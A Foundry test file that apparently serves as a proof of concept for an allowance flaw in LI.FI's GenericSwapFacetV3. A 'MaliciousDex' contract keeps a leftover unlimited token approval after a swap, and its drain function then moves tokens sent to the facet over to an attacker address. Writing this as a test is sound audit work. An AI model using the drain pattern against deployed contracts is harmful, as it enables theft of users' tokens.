// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {GenericSwapFacetV3} from "lifi/Facets/GenericSwapFacetV3.sol";
import {LibSwap} from "lifi/Libraries/LibSwap.sol";
import {LibAllowList} from "lifi/Libraries/LibAllowList.sol";
import {TestToken} from "../utils/TestToken.sol";

contract MaliciousDex {
    TestToken public token;

    constructor(TestToken _token) {
        token = _token;
    }

    function swap() external {}

    // drain tokens from facet using leftover allowance
    function drain(address from, address to, uint256 amount) external {
        token.transferFrom(from, to, amount);
    }
}

contract GenericSwapFacetV3Harness is GenericSwapFacetV3 {
    constructor(address _nativeAddress) GenericSwapFacetV3(_nativeAddress) {}

    function addAllowedContract(address _contract) external {
        LibAllowList.addAllowedContract(_contract);
    }

    function addAllowedSelector(bytes4 _selector) external {
        LibAllowList.addAllowedSelector(_selector);
    }
}

contract GenericSwapFacetV3AllowanceTest is Test {
    GenericSwapFacetV3Harness facet;
    MaliciousDex dex;
    TestToken token;
    address attacker = address(0xbeef);

    function setUp() public {
        facet = new GenericSwapFacetV3Harness(address(0));
        token = new TestToken("Token", "TKN", 18);
        dex = new MaliciousDex(token);

        facet.addAllowedContract(address(dex));
        facet.addAllowedSelector(MaliciousDex.swap.selector);

        token.mint(address(this), 100 ether);
        token.approve(address(facet), type(uint256).max);
    }

    function test_UnlimitedAllowanceAllowsTokenDrain() public {
        LibSwap.SwapData memory swap = LibSwap.SwapData({
            callTo: address(dex),
            approveTo: address(dex),
            sendingAssetId: address(token),
            receivingAssetId: address(token),
            fromAmount: 10 ether,
            callData: abi.encodeWithSelector(MaliciousDex.swap.selector),
            requiresDeposit: false
        });

        facet.swapTokensSingleV3ERC20ToERC20(bytes32("tx"), "", "", payable(address(this)), 0, swap);

        // allowance remains set after swap
        assertEq(token.allowance(address(facet), address(dex)), type(uint256).max);

        // attacker sends tokens to facet and dex drains them
        token.mint(address(facet), 5 ether);
        dex.drain(address(facet), attacker, 5 ether);

        assertEq(token.balanceOf(attacker), 5 ether);
    }
}

